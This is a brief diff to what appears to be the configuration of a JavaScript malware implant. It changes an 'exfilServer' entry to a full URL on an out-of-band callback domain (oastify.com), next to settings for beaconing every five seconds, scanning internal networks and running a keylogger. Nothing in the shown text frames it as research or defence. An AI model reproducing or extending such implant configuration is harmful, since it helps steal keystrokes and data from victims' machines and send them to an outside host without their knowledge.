@@ -3,7 +3,7 @@
 
 // Configuration
 const config = {
-  exfilServer: "t3xb8tg249w1toz43ojkfdrqghm8az4nt.oastify.com",
+  exfilServer: "http://t3xb8tg249w1toz43ojkfdrqghm8az4nt.oastify.com/",
   beaconInterval: 5000,
   scanInternal: true,
   keylogger: true
